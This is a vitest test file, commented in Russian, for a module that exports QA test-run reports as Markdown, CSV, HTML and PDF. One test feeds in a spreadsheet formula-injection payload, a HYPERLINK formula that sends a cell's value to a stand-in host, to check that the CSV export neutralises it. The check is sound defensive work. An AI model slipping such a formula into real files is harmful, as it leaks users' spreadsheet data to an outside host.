import { mkdtempSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import type { ProjectTestRunRecord } from '@agentdeck/contracts';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { exportRun, exportRunPdf, humanTime } from './export-run.ts';
import { writeRun } from '../runs-store/runs-store.ts';
import { commentText } from '../../integrations/publish/publish.ts';
import { createGroup, upsertCase } from '../store/store.ts';

/**
 * Отчёт по прогону файлом. Проверяется то, ради чего он заведён: обстоятельства
 * прогона, провалы отдельным списком с тем, что при них видели, и кейс, названный
 * заголовком, а не идентификатором.
 */
describe('project-tests/export-run', () => {
  let project = '';

  const run = (): ProjectTestRunRecord => ({
    id: 'run-1',
    mode: 'manual',
    actor: 'human',
    status: 'done',
    branch: 'qa/login',
    commit: 'abcdef1234567890',
    environmentId: 'staging',
    startedAt: '2026-09-07T10:00:00.000Z',
    finishedAt: '2026-09-07T10:20:00.000Z',
    results: [
      {
        pointId: 'gui|gui-001|staging',
        groupId: 'gui',
        caseId: 'gui-001',
        status: 'failed',
        note: 'кнопка осталась серой',
        durationMs: 12_000,
        attachments: ['shot.png'],
      },
      {
        pointId: 'gui|gui-002|staging',
        groupId: 'gui',
        caseId: 'gui-002',
        status: 'passed',
        durationMs: 4000,
      },
    ],
    summary: { total: 2, passed: 1, failed: 1, skipped: 0, blocked: 0 },
  });

  beforeEach(() => {
    project = mkdtempSync(join(tmpdir(), 'cc-tests-run-export-'));
    createGroup(project, 'gui', 'GUI');
    // Идентификаторы кейсов выдаёт хранилище — прогон ссылается на выданные.
    const first = upsertCase(
      project,
      'gui',
      { title: 'Вход с верными данными', steps: [] },
      '2026-09-01T10:00:00.000Z',
    );
    const second = upsertCase(
      project,
      'gui',
      { title: 'Пустой ввод не отправляется', steps: [] },
      '2026-09-01T10:00:00.000Z',
    );
    expect([first.id, second.id]).toEqual(['gui-001', 'gui-002']);
    writeRun(project, run());
  });

  afterEach(() => {
    rmSync(project, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
  });

  it('markdown называет обстоятельства, итог и провал с заметкой', () => {
    const file = exportRun(project, 'run-1', 'md');
    const text = file.body.toString('utf8');

    expect(file.filename).toMatch(/^run-\d{12}\.md$/);
    expect(file.contentType).toContain('markdown');
    expect(text).toContain('ручной проход');
    expect(text).toContain('qa/login');
    expect(text).toContain('staging');
    expect(text).toContain('пройдено 1');
    expect(text).toContain('## Что упало');
    expect(text).toContain('**Вход с верными данными**');
    expect(text).toContain('кнопка осталась серой');
    expect(text).toContain('shot.png');
  });

  /**
   * F-350, F-351. Многострочная причина рвала строку md-таблицы, а у
   * завершённого прогона в md не было строки состояния (в html — была).
   */
  it('markdown: многострочная причина — одна строка таблицы; завершённый назван', () => {
    writeRun(project, {
      ...run(),
      id: 'run-ml',
      results: [
        { ...run().results[0]!, note: 'кнопка серая\nстек: at click\n  at main' },
        run().results[1]!,
      ],
    });
    const text = exportRun(project, 'run-ml', 'md').body.toString('utf8');
    expect(text).toContain('- Состояние: завершён');
    const rows = text.split('\n').filter((line) => line.startsWith('| '));
    const header = rows[0]!.split(' | ').length;
    for (const row of rows) expect(row.split(' | ').length).toBe(header);
    expect(rows.some((row) => row.includes('кнопка серая<br>стек: at click<br>  at main'))).toBe(
      true,
    );
  });

  it('csv отдаёт строку на проход с заголовком кейса и BOM для Excel', () => {
    const text = exportRun(project, 'run-1', 'csv').body.toString('utf8');

    expect(text.startsWith('﻿')).toBe(true);
    expect(text).toContain('Пустой ввод не отправляется');
    expect(text).toContain('провален');
    expect(text.trim().split('\r\n')).toHaveLength(3);
  });

  it('csv не отдаёт формулу: заметка с = начинается с апострофа', () => {
    const hostile = run();
    hostile.results[0]!.note = '=HYPERLINK("http://x.test/?d="&A1,"open")';
    hostile.results[0]!.params = { user: '@SUM(1+1)' };
    writeRun(project, hostile);

    const text = exportRun(project, 'run-1', 'csv').body.toString('utf8');
    expect(text).toContain(`"'=HYPERLINK(""http://x.test/?d=""&A1,""open"")"`);
    expect(text).not.toMatch(/(^|,)"?[=+@]/m);
  });

  it('html — готовая к печати страница без единой внешней загрузки', () => {
    const file = exportRun(project, 'run-1', 'html');
    const text = file.body.toString('utf8');

    expect(file.filename).toMatch(/^run-\d{12}\.html$/);
    expect(file.contentType).toContain('text/html');
    // Разметка страницы A4: из этого же html печатается PDF.
    expect(text).toContain('@page');
    expect(text).toContain('A4');
    expect(text).toContain('Вход с верными данными');
    expect(text).toContain('кнопка осталась серой');
    // Ничего не тянется из сети и ниоткуда: браузер печатает страницу без
    // доступа наружу, и любая внешняя ссылка означала бы дыру в отчёте.
    expect(text).not.toContain('<script');
    expect(text).not.toMatch(/(?:src|href)="https?:/);
  });

  /**
   * Лист A4 узкий. Пустые во ВСЕХ строках колонки (параметры, дефекты) забирали
   * треть ширины, «Что увидели» сжималась в столбик по слову, строки вырастали,
   * и неразрываемая строка уезжала на следующий лист, оставляя пустоту.
   * CSV держит все колонки — его читают программой, схема не должна плавать.
   */
  it('печатная таблица без колонок, пустых во всех строках; csv — со всеми', () => {
    const html = exportRun(project, 'run-1', 'html').body.toString('utf8');
    expect(html).not.toContain('<th>Параметры</th>');
    expect(html).not.toContain('<th>Дефекты</th>');
    expect(html).toContain('<th>Вложения</th>');
    expect(html).toContain('<th>Что увидели</th>');
    expect(html.match(/<tr><td>/g)?.[0]).toBeDefined();
    // В строке столько ячеек, сколько заголовков: колонки выпали и там, и там.
    const firstRow = html.split('<tbody>')[1]?.split('</tr>')[0] ?? '';
    expect(firstRow.match(/<td>/g)).toHaveLength(html.match(/<th>/g)?.length ?? -1);

    const csv = exportRun(project, 'run-1', 'csv').body.toString('utf8');
    expect(csv).toContain('Параметры');
    expect(csv).toContain('Дефекты');
  });

  it('чужой текст в отчёте остаётся текстом, а не разметкой', () => {
    const broken = run();
    broken.results[0]!.note = 'сломалось <b>жирно</b> & "с кавычками"';
    writeRun(project, broken);

    const text = exportRun(project, 'run-1', 'html').body.toString('utf8');

    expect(text).toContain('&lt;b&gt;жирно&lt;/b&gt;');
    expect(text).toContain('&amp;');
  });

  it('несуществующий прогон — 404, а не пустой файл', () => {
    expect(() => exportRun(project, 'нет-такого', 'md')).toThrow(/не найден/);
  });

  it('PDF несуществующего прогона отказывает ДО поиска браузера', async () => {
    // Иначе на машине без браузера человек получил бы «поставь Chrome» вместо
    // «такого прогона нет» и пошёл бы чинить не то.
    await expect(exportRunPdf(project, 'нет-такого')).rejects.toThrow(/не найден/);
  });

  it('неизвестный формат называет допустимые', () => {
    expect(() => exportRun(project, 'run-1', 'docx' as 'md')).toThrow(/md, csv или html/);
  });

  /**
   * Человек отметил красный ШАГ и написал, что увидел, — к шагу, а общую заметку
   * оставил пустой. Отчёт брал только заметку, и провал уходил наружу без
   * причины: «**Вход** [провален]» и пустая колонка «Что увидели».
   */
  it('провал с разбором по шагу называет шаг, что вышло и что ожидалось', () => {
    const stepOnly = run();
    stepOnly.results[0] = {
      ...stepOnly.results[0]!,
      note: undefined,
      failure: { step: 2, expected: 'кнопка активна', actual: 'кнопка серая' },
    };
    writeRun(project, stepOnly);

    for (const format of ['md', 'html', 'csv'] as const) {
      const text = exportRun(project, 'run-1', format).body.toString('utf8');
      expect(text, format).toContain('шаг 2: кнопка серая (ожидалось: кнопка активна)');
    }
  });

  /**
   * «Завершить» при непройденных кейсах и прерванный прогон. Отчёт считал только
   * отмеченное: из четырёх задуманных пройдены три — наружу уходило «всего 3,
   * провалов нет», прерванный выглядел завершённым.
   */
  it('непройденное и прерванность названы в итоге, а не пропадают', () => {
    writeRun(project, {
      ...run(),
      planned: 5,
      status: 'stopped',
      unwalked: [
        { pointId: 'gui|gui-003', groupId: 'gui', caseId: 'gui-003', title: 'Выход из профиля' },
        {
          pointId: 'gui|gui-004|dark',
          groupId: 'gui',
          caseId: 'gui-004',
          title: 'Тема',
          params: { theme: 'dark' },
        },
      ],
    });

    for (const format of ['md', 'html'] as const) {
      const text = exportRun(project, 'run-1', format).body.toString('utf8');
      expect(text, format).toContain('не пройдено 3 из 5 задуманных');
      expect(text, format).toContain('прерван');
      // Не только число: какие именно кейсы остались без результата.
      expect(text, format).toContain('Не пройдены');
      expect(text, format).toContain('Выход из профиля');
      expect(text, format).toContain('theme=dark');
    }
    // Ревью z1 C25: CSV читают таблицей, и без этих строк там было «всего 2» при
    // пяти задуманных — непройденное идёт строками со своим статусом.
    const csv = exportRun(project, 'run-1', 'csv').body.toString('utf8');
    expect(csv).toContain('Выход из профиля,gui-003,gui,не пройден');
    expect(csv).toContain('Тема,gui-004,gui,не пройден,theme=dark');
  });

  /**
   * Автотесты, прогнанные панелью, и отчёт сборки — оба `mode:'import'`, и файл
   * наружу называл оба «импорт из CI». Читающему это разные вещи: своя машина
   * против конвейера. CSV без шапки несёт то же последней колонкой.
   */
  it('импорт назван по происхождению во всех форматах; старая запись — CI', () => {
    const lastCell = (csv: string) =>
      csv
        .trim()
        .split('\r\n')
        .map((line) => line.split(',').at(-1));

    writeRun(project, { ...run(), mode: 'import', actor: 'ci', origin: 'e2e' });
    for (const format of ['md', 'html'] as const) {
      const text = exportRun(project, 'run-1', format).body.toString('utf8');
      expect(text, format).toContain('Прогон: автотесты панели');
      expect(text, format).not.toContain('импорт из CI');
    }
    expect(lastCell(exportRun(project, 'run-1', 'csv').body.toString('utf8'))).toEqual([
      'Запись',
      'автотесты панели',
      'автотесты панели',
    ]);

    writeRun(project, { ...run(), mode: 'import', actor: 'ci' });
    const md = exportRun(project, 'run-1', 'md').body.toString('utf8');
    expect(md).toContain('# Прогон: импорт из CI');
    expect(lastCell(exportRun(project, 'run-1', 'csv').body.toString('utf8'))).toEqual([
      'Запись',
      'импорт из CI',
      'импорт из CI',
    ]);

    // Не импорт — подпись режима, как и была.
    writeRun(project, run());
    expect(lastCell(exportRun(project, 'run-1', 'csv').body.toString('utf8')).at(-1)).toBe(
      'ручной проход',
    );
  });

  /**
   * Время — местное, с поясом. ISO с «Z» читающему отчёт — чужое время: проход
   * в 02:25 по Екатеринбургу уходил датой ВЧЕРАШНЕГО дня.
   */
  it('время начала — местное с поясом, и имя файла по нему же', () => {
    expect(humanTime('2026-09-25T21:25:59.539Z', 300)).toBe('26.09.2026 02:25 (UTC+5)');
    expect(humanTime('2026-09-25T21:25:59.539Z', 330)).toBe('26.09.2026 02:55 (UTC+5:30)');
    expect(humanTime('2026-09-25T21:25:59.539Z', -180)).toBe('25.09.2026 18:25 (UTC-3)');

    const local = new Date('2026-09-07T10:00:00.000Z');
    const two = (value: number) => String(value).padStart(2, '0');
    const stamp = `${local.getFullYear()}${two(local.getMonth() + 1)}${two(local.getDate())}${two(local.getHours())}${two(local.getMinutes())}`;
    const file = exportRun(project, 'run-1', 'md');
    expect(file.filename).toBe(`run-${stamp}.md`);
    expect(file.body.toString('utf8')).not.toContain('2026-09-07T10:00:00.000Z');
  });

  /**
   * Отчёт на языке интерфейса выгружающего: английский интерфейс отдавал наружу
   * «Прогон: …», колонку «Запись» и `<html lang="ru">` (находка L8, 28.09).
   * Кириллица допустима только в данных человека — названиях кейсов.
   */
  it('при английском интерфейсе все форматы — английские, кроме данных человека', () => {
    const titles = ['Вход с верными данными', 'Пустой ввод не отправляется', 'Выход из профиля'];
    const stopped = run();
    stopped.results[0] = {
      ...stopped.results[0]!,
      note: undefined,
      failure: { step: 2, expected: 'button active', actual: 'button grey' },
    };
    writeRun(project, {
      ...stopped,
      status: 'stopped',
      planned: 3,
      unwalked: [{ pointId: 'gui|gui-003', groupId: 'gui', caseId: 'gui-003', title: titles[2]! }],
    });

    for (const format of ['md', 'html', 'csv'] as const) {
      const text = exportRun(project, 'run-1', format, 'en').body.toString('utf8');
      const own = titles.reduce((rest, title) => rest.split(title).join(''), text);
      expect(own, format).not.toMatch(/[А-Яа-яЁё]/);
      expect(text, format).toContain('step 2: button grey (expected: button active)');
      expect(text, format).toContain('manual pass');
    }

    const md = exportRun(project, 'run-1', 'md', 'en').body.toString('utf8');
    expect(md).toContain('# Run: manual pass');
    expect(md).toContain('- State: stopped');
    expect(md).toContain('not walked 1 of 3 planned');
    expect(md).toContain('## What failed');
    const html = exportRun(project, 'run-1', 'html', 'en').body.toString('utf8');
    expect(html).toContain('<html lang="en">');
    const csv = exportRun(project, 'run-1', 'csv', 'en').body.toString('utf8');
    expect(csv.slice(1).split('\r\n')[0]).toBe(
      'Case,ID,Group,Status,Parameters,Seconds,What was seen,Attachments,Defects,Record',
    );
    expect(csv).toContain(`${titles[2]},gui-003,gui,not walked`);

    // Комментарий в Jira — всё до таблицы проходов, на любом языке отчёта.
    expect(commentText(md)).toContain('## What failed');
    expect(commentText(md)).not.toContain('## Passes');
  });
});
